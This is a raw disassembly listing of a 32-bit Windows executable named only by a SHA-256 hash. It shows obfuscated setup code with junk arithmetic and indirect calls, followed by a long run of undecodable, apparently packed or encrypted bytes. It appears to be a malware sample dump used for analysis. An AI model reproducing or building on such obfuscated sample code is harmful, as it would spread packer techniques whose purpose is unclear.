
e844fca9080f4f70a179fab59363557f2f7104e07bd13ffcf394022f6282825c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0xa131c454
  40157e:	shr    BYTE PTR [ebx],1
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [edi],eax
  401595:	mov    ecx,DWORD PTR [edx+0x22b38a8b]
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x235c06c4],0xc4
  40162d:	add    ecx,DWORD PTR [eax+0x1d703f6e]
  401633:	sub    dh,BYTE PTR [esi-0x3a]
  401636:	adc    esi,edx
  401638:	daa    
  401639:	test   al,0xdb
  40163b:	xchg   ecx,eax
  40163c:	mov    eax,ds:0x893c7bdc
  401641:	mov    bh,0x65
  401643:	rcl    DWORD PTR [esi-0x12],cl
  401646:	or     eax,0xe409d09c
  40164b:	bound  edi,QWORD PTR ds:0x9b5a7b0f
  401651:	add    al,BYTE PTR [edx+edx*8-0x40]
  401655:	outs   dx,BYTE PTR cs:[esi]
  401657:	jp     0x401614
  401659:	bound  esp,QWORD PTR [edx+0x22dce801]
  40165f:	mov    esp,0xb5eca6a
  401664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401666:	jecxz  0x4015fd
  401668:	mov    esp,DWORD PTR [edx]
  40166a:	push   cs
  40166b:	jno    0x401647
  40166d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40166f:	je     0x401614
  401671:	aad    0x90
  401673:	adc    cl,dl
  401675:	loopne 0x4016f6
  401677:	je     0x401618
  401679:	pop    ebx
  40167a:	xor    ecx,DWORD PTR [ebx]
  40167c:	xchg   ebp,eax
  40167d:	sti    
  40167e:	pop    esp
  40167f:	dec    ebx
  401680:	mov    ds:0x5398d20b,al
  401685:	and    cl,BYTE PTR [esp+edi*8]
  401688:	push   0xffffff9a
  40168a:	ss jg  0x4016c3
  40168d:	test   dh,dh
  40168f:	mov    ebp,ebx
  401691:	stos   DWORD PTR es:[edi],eax
  401692:	push   cs
  401693:	xchg   ecx,eax
  401694:	popf   
  401695:	push   ebp
  401696:	mov    al,0x15
  401698:	jmp    0xb777:0x43e73d62
  40169f:	jp     0x4016bd
  4016a1:	cs ret 
  4016a3:	pop    edx
  4016a4:	aaa    
  4016a5:	add    DWORD PTR [eax],eax
  4016a7:	fild   DWORD PTR [esi-0x1c708b8e]
  4016ad:	mov    es,WORD PTR [edi+0xcca1188]
  4016b3:	and    al,0x43
  4016b5:	ret    0x4a03
  4016b8:	js     0x40168c
  4016ba:	jmp    0x4b1415ac
  4016bf:	and    edx,esp
  4016c1:	aaa    
  4016c2:	mov    WORD PTR [eax+0x3],fs
  4016c5:	test   DWORD PTR [edx+0x3a],edi
  4016c8:	inc    ebx
  4016c9:	mov    ch,0x5e
  4016cb:	arpl   bp,di
  4016cd:	lea    ecx,[ebp-0x78b4958b]
  4016d3:	mov    ah,0x67
  4016d5:	xor    eax,0xef39ca3a
  4016da:	cmp    al,0xa2
  4016dc:	test   al,0x8
  4016de:	les    eax,FWORD PTR [ebx]
  4016e0:	sub    al,BYTE PTR [ecx]
  4016e2:	scas   al,BYTE PTR es:[edi]
  4016e3:	dec    esp
  4016e4:	lahf   
  4016e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e6:	cmp    DWORD PTR [ebx+eiz*1+0x7d],edx
  4016ea:	jmp    DWORD PTR [edx]
  4016ec:	push   edi
  4016ed:	nop
  4016ee:	jmp    0x3f03396c
  4016f3:	jae    0x40174c
  4016f5:	inc    ecx
  4016f6:	ror    cl,1
  4016f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016f9:	xchg   ebx,eax
  4016fa:	das    
  4016fb:	int    0x53
  4016fd:	pop    ss
  4016fe:	ins    DWORD PTR es:[edi],dx
  4016ff:	sbb    eax,0x9b62397b
  401704:	jmp    0xc9cf5049
  401709:	xchg   esi,eax
  40170a:	mov    BYTE PTR [esi],bl
  40170c:	pusha  
  40170d:	cs ret 
  40170f:	(bad)  [esi+edx*4+0x54]
  401713:	xor    al,0x85
  401715:	or     eax,0xbd7cd61f
  40171a:	repz not DWORD PTR [edi]
  40171d:	fidivr WORD PTR [edi-0x66]
  401720:	sub    DWORD PTR [esi-0x3f],edi
  401723:	push   ebx
  401724:	imul   edi,DWORD PTR [edx+0x3b95ee8a],0xffffff92
  40172b:	in     eax,0x6
  40172d:	cmp    eax,0x1ecab39f
  401732:	sbb    eax,0x530beb4d
  401737:	mov    WORD PTR es:[edx],ss
  40173a:	push   edx
  40173b:	jmp    0x4016c1
  40173d:	fimul  DWORD PTR [ebx-0x56]
  401740:	fisttp QWORD PTR ds:0x455a76d3
  401746:	repnz bnd jmp 0x4016ca
  40174a:	pop    edx
  40174b:	(bad)  
  40174c:	cld    
  40174d:	sbb    edx,esp
  40174f:	cdq    
  401750:	jns    0x4016f1
  401752:	jmp    0x3ad9:0x9bd1e57a
  401759:	(bad)  
  40175a:	mov    ebp,esp
  40175c:	out    0xe1,eax
  40175e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40175f:	(bad)  
  401760:	loope  0x401772
  401762:	pop    ss
  401763:	xor    ecx,ebp
  401765:	(bad)  
  401766:	std    
  401767:	out    0x6f,eax
  401769:	gs pop es
  40176b:	fsubr  DWORD PTR [edi-0x5f]
  40176e:	lods   eax,DWORD PTR ds:[esi]
  40176f:	mov    bh,0x11
  401771:	fwait
  401772:	and    al,0x76
  401774:	adc    DWORD PTR [eax],esi
  401776:	outs   dx,DWORD PTR ds:[esi]
  401777:	jge    0x40176b
  401779:	adc    BYTE PTR [edi+0x55],al
  40177c:	(bad)  
  40177e:	imul   esi,DWORD PTR [edx+0x2a298f08],0x766c4b95
  401788:	lahf   
  401789:	(bad)  
  40178a:	push   ebx
  40178b:	in     al,dx
  40178c:	push   edi
  40178d:	jge    0x40180b
  40178f:	xor    esp,ecx
  401791:	inc    edi
  401792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401793:	leave  
  401794:	test   ah,0x2d
  401797:	mov    edx,0x9b36eb0d
  40179c:	dec    ecx
  40179d:	adc    eax,0x90d41779
  4017a2:	sub    eax,0x913f548a
  4017a7:	in     eax,0x71
  4017a9:	shl    BYTE PTR [esi-0x2],0xbb
  4017ad:	cld    
  4017ae:	bound  ecx,QWORD PTR [esi]
  4017b0:	add    DWORD PTR [edx+0x1b],ebp
  4017b3:	sar    edi,0xc6
  4017b6:	not    DWORD PTR [esi+0x6a]
  4017b9:	jbe    0x40182d
  4017bb:	out    0x6e,eax
  4017bd:	jbe    0x4017ca
  4017bf:	mov    edx,0xd5b3a202
  4017c4:	lds    ebx,FWORD PTR [ecx+0x64ea719]
  4017ca:	mov    DWORD PTR [ebx+0x42],esp
  4017cd:	jp     0x40184a
  4017cf:	rcr    DWORD PTR [esi],1
  4017d1:	add    dl,bl
  4017d3:	popa   
  4017d4:	xchg   ebx,eax
  4017d5:	adc    BYTE PTR [ebx-0x70295812],0x2c
  4017dc:	or     edx,eax
  4017de:	(bad)  
  4017df:	or     al,0x2d
  4017e1:	fwait
  4017e2:	imul   eax,ebx,0x807a9960
  4017e8:	(bad)
  4017ec:	cmp    edx,DWORD PTR [ebx]
  4017ee:	xchg   esp,eax
  4017ef:	push   ecx
  4017f0:	dec    ecx
  4017f1:	fisttp WORD PTR [edi-0x80]
  4017f4:	sub    eax,0x8ca2134b
  4017f9:	pop    edx
  4017fa:	mov    ebp,0xc3308cd0
  4017ff:	fnsavew [ebp-0x3ab2d378]
  401806:	mov    bl,0x44
  401808:	gs cmp esi,edi
  40180b:	mov    bh,0x0
  40180d:	inc    ebp
  40180e:	jecxz  0x401851
  401810:	sbb    eax,0xdb3e40fe
  401815:	cli    
  401816:	pop    ds
  401817:	jo     0x4017a4
  401819:	push   ebp
  40181a:	or     BYTE PTR [ebx-0x2c],ah
  40181d:	out    dx,eax
  40181e:	aas    
  40181f:	clc    
  401820:	sbb    DWORD PTR [esi-0x6ee9b50e],ebp
  401826:	mov    ebx,0x36b17d85
  40182b:	jns    0x4018a1
  40182d:	mov    ds:0xa4e28a43,al
  401832:	test   DWORD PTR [esi],ebp
  401834:	jno    0x401888
  401836:	(bad)  
  401837:	fidivr DWORD PTR [eax+eiz*8+0x7]
  40183b:	inc    ebx
  40183c:	push   ebx
  40183d:	mov    eax,0xa8260a27
  401842:	sub    eax,0x3cc2d15a
  401847:	(bad)  
  401848:	adc    edx,DWORD PTR [ecx]
  40184a:	dec    esp
  40184b:	(bad)  
  40184c:	mov    cl,0x74
  40184e:	lock fimul DWORD PTR [edi+0x55]
  401852:	imul   edi,DWORD PTR [eax],0xffffff91
  401855:	cmp    dl,bl
  401857:	adc    dh,al
  401859:	inc    ebp
  40185a:	pop    edi
  40185b:	xchg   ebp,eax
  40185c:	pop    edi
  40185d:	(bad)  
  40185e:	js     0x4018cb
  401860:	sub    DWORD PTR [edi-0x10],ebx
  401863:	push   edi
  401864:	xchg   BYTE PTR [esi+ebx*2+0x3655fac2],ch
  40186b:	ret    
  40186c:	sbb    DWORD PTR [eax+0x5e87c295],ebx
  401872:	les    eax,FWORD PTR [eax+0x45a1ad25]
  401878:	xor    DWORD PTR [eax+0x14],esp
  40187b:	push   edi
  40187c:	xchg   BYTE PTR [edi],dl
  40187e:	jo     0x401829
  401880:	push   ecx
  401881:	stos   DWORD PTR es:[edi],eax
  401882:	xlat   BYTE PTR ds:[ebx]
  401883:	xchg   ebp,eax
  401884:	imul   DWORD PTR [esi-0x2]
  401887:	and    DWORD PTR [ebp-0x36160928],ebx
  40188d:	jo     0x401885
  40188f:	dec    edx
  401890:	int    0xd
  401892:	out    0xfa,al
  401894:	icebp  
  401895:	cmp    ch,dh
  401897:	(bad)  
  401898:	hlt    
  401899:	cmc    
  40189a:	nop    eax
  40189d:	or     BYTE PTR [edi],0x2e
  4018a0:	iret   
  4018a1:	push   ebx
  4018a2:	adc    edi,esp
  4018a4:	aad    0x24
  4018a6:	inc    edi
  4018a7:	or     eax,0xd105c4dc
  4018ac:	out    dx,eax
  4018ad:	xchg   esp,eax
  4018ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018af:	jecxz  0x401854
  4018b1:	(bad)  
  4018b2:	xchg   edi,eax
  4018b3:	je     0x40190b
  4018b5:	dec    ebp
  4018b6:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018b8:	fcos   
  4018ba:	out    0xac,eax
  4018bc:	rcl    DWORD PTR [esi+0x4f1aeafc],1
  4018c2:	dec    edx
  4018c3:	pop    edx
  4018c4:	arpl   si,bp
  4018c6:	das    
  4018c7:	ror    DWORD PTR ds:0xb5153c,0xa
  4018ce:	test   bh,al
  4018d0:	pushf  
  4018d1:	push   ecx
  4018d2:	or     DWORD PTR [esi+eiz*4+0x5b],0x77
  4018d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018d8:	sbb    ecx,eax
  4018da:	sbb    al,0x5b
  4018dc:	pop    esp
  4018dd:	imul   ecx,DWORD PTR ds:0xbc9db428,0x77
  4018e4:	jns    0x40191c
  4018e6:	clc    
  4018e7:	hlt    
  4018e8:	(bad)  
  4018e9:	gs popf 
  4018eb:	jbe    0x40186e
  4018ed:	or     dh,bh
  4018ef:	jle    0x401930
  4018f1:	out    dx,eax
  4018f2:	lods   al,BYTE PTR ds:[esi]
  4018f3:	out    dx,al
  4018f4:	dec    eax
  4018f5:	jno    0x40187d
  4018f7:	adc    bl,BYTE PTR [edi+0x713c619]
  4018fd:	dec    ebx
  4018fe:	lods   al,BYTE PTR ds:[esi]
  4018ff:	mov    dh,0x34
  401901:	inc    esp
  401902:	sti    
  401903:	into   
  401904:	icebp  
  401905:	sbb    DWORD PTR ss:[ecx+eiz*4],0xaff157b6
  40190d:	int    0x6a
  40190f:	cwde   
  401910:	aaa    
  401911:	pushf  
  401912:	add    al,0x82
  401914:	sub    ebp,ecx
  401916:	mov    DWORD PTR [ebx],edx
  401918:	xor    BYTE PTR [esi+eiz*2+0x5b],ah
  40191c:	dec    ecx
  40191d:	ds adc al,0xd8
  401920:	dec    DWORD PTR cs:[edi]
  401923:	pop    esi
  401924:	adc    al,dl
  401926:	mov    edi,0x4361b42c
  40192b:	rcl    bh,cl
  40192d:	not    DWORD PTR ds:[edi]
  401930:	retf   
  401931:	hlt    
  401932:	push   esp
  401933:	mov    ds:0x7eaf16fb,al
  401938:	icebp  
  401939:	cmp    eax,0xd4185aae
  40193e:	pop    ecx
  40193f:	inc    edx
  401940:	(bad)  
  401941:	cmp    al,0xe2
  401943:	add    edx,ecx
  401945:	cmp    eax,0xf84f36d1
  40194a:	rcl    esp,1
  40194c:	(bad)  
  40194d:	sub    BYTE PTR [edi+eax*1],cl
  401950:	dec    ebp
  401951:	or     al,0x86
  401953:	adc    DWORD PTR [edx+edx*4],0x4ff68895
  40195a:	outs   dx,BYTE PTR ds:[esi]
  40195b:	pop    ecx
  40195c:	dec    ecx
  40195d:	xlat   BYTE PTR ds:[ebx]
  40195e:	push   ds
  40195f:	iret   
  401960:	bound  ebx,QWORD PTR [eax-0x10089a7d]
  401966:	jmp    0xae13:0x88bbb388
  40196d:	and    dl,BYTE PTR [ebx]
  40196f:	dec    esi
  401970:	loopne 0x401906
  401972:	push   0x4740e36e
  401977:	pop    esp
  401978:	pop    ebp
  401979:	xor    BYTE PTR [edx],bl
  40197b:	dec    BYTE PTR [edi]
  40197d:	or     eax,0x5eedc796
  401982:	nop
  401983:	push   cs
  401984:	int3   
  401985:	loope  0x401916
  401987:	mov    bl,0xce
  401989:	push   edx
  40198a:	mov    dl,BYTE PTR ds:0x3f8cd078
  401990:	push   edi
  401991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401992:	data16 (bad) 
  401994:	daa    
  401995:	jmp    DWORD PTR [eax]
  401997:	not    DWORD PTR [ecx+eiz*8]
  40199a:	xor    dh,BYTE PTR [ebx]
  40199c:	inc    edi
  40199d:	xchg   edx,eax
  40199e:	adc    BYTE PTR [esi-0xf81b0d7],0x38
  4019a5:	sub    eax,0xd60c9f34
  4019aa:	fdiv   QWORD PTR [edi]
  4019ac:	sbb    BYTE PTR ds:0x8706e28d,0xa5
  4019b3:	xor    edx,esp
  4019b5:	outs   dx,DWORD PTR ds:[esi]
  4019b6:	sbb    BYTE PTR [edx],bl
  4019b8:	xor    ecx,eax
  4019ba:	mov    ah,0x7f
  4019bc:	fstp   st(3)
  4019be:	call   0x69144a31
  4019c3:	push   esp
  4019c4:	or     bl,BYTE PTR [edx-0x5d]
  4019c7:	ss jp  0x401a1a
  4019ca:	mov    al,0x56
  4019cc:	sub    al,0x60
  4019ce:	sahf   
  4019cf:	lods   al,BYTE PTR ds:[esi]
  4019d0:	in     eax,0xc1
